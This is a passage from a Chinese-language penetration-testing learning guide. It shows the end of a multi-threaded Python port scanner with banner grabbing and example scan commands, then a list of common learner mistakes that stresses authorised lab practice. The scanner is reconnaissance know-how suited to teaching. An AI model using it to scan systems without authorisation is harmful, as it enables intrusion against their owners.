        # 填充任务队列
        for port in self.ports:
            self.queue.put(port)
        
        # 创建并启动线程
        threads = []
        for _ in range(min(self.threads, len(self.ports))):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        # 等待所有任务完成
        self.queue.join()
        
        # 输出结果
        print("-" * 60)
        print(f"{'PORT':<10}{'STATE':<10}{'SERVICE':<15}{'BANNER'}")
        print("-" * 60)
        for port, service, banner in sorted(self.open_ports):
            print(f"{port:<10}{'OPEN':<10}{service:<15}{banner[:50]}")
        print(f"\n[+] Scan completed: {len(self.open_ports)} open ports found")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Multi-threaded Port Scanner")
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("-p", "--ports", default="1-1024", help="Port range (default: 1-1024)")
    parser.add_argument("-t", "--threads", type=int, default=100, help="Thread count (default: 100)")
    parser.add_argument("--timeout", type=float, default=1, help="Connection timeout (default: 1s)")
    args = parser.parse_args()
    
    # 解析端口范围
    if "-" in args.ports:
        start, end = map(int, args.ports.split("-"))
        ports = range(start, end + 1)
    else:
        ports = [int(p) for p in args.ports.split(",")]
    
    scanner = PortScanner(args.target, ports, args.threads, args.timeout)
    scanner.run()
```

**使用方法**：

```bash
# 基本扫描
python3 scanner.py 192.168.1.100

# 指定端口范围和线程数
python3 scanner.py 192.168.1.100 -p 1-65535 -t 200

# 指定特定端口
python3 scanner.py 192.168.1.100 -p 22,80,443,3389,8080
```

## 六、常见误区与纠正

### 误区1：只看不练

很多初学者花大量时间阅读教程和书籍，却很少动手实践。安全技能是"肌肉记忆"——只有反复操作才能形成直觉。

**纠正方法**：遵循"70-20-10"原则——70%时间动手练习，20%时间阅读Writeup和分析他人方法，10%时间阅读理论书籍。

### 误区2：追求工具数量而非深度

收集了大量安全工具但每个都只会基本用法，遇到问题就换工具而不是深入理解。

**纠正方法**：精通5-10个核心工具（Nmap、Metasploit、Burp Suite、Impacket、BloodHound、CrackMapExec、PowerView、hashcat、John、sqlmap），做到不看文档就能灵活使用。

### 误区3：忽略报告编写

渗透测试的价值不仅在于发现漏洞，更在于清晰地传达发现。很多技术人员忽视报告编写能力。

**纠正方法**：每完成一台靶机都写一份简短的渗透报告，包含：目标概述、发现的漏洞、风险评级、复现步骤、修复建议。

### 误区4：只练攻击不学防御

纯攻击思维会导致对防御体系的理解不足，而真实的渗透测试需要理解防御者会如何检测和响应。

**纠正方法**：同时学习蓝队技术——日志分析、入侵检测、事件响应。使用DetectionLab等蓝队靶场练习检测能力。

### 误区5：在非授权环境中练习

在未经授权的系统上进行渗透测试是违法行为，即使是出于学习目的。

**纠正方法**：只在自建的虚拟环境或授权的在线靶场（HackTheBox、TryHackMe、VulnHub）中练习。永远不要在未获得书面授权的情况下测试他人的系统。

***

通过系统化的练习和持续的实战，读者能够逐步掌握Windows和macOS系统的安全攻防技术。关键原则：**动手实践优于被动阅读，深度理解优于广度覆盖，合法合规是一切练习的前提**。
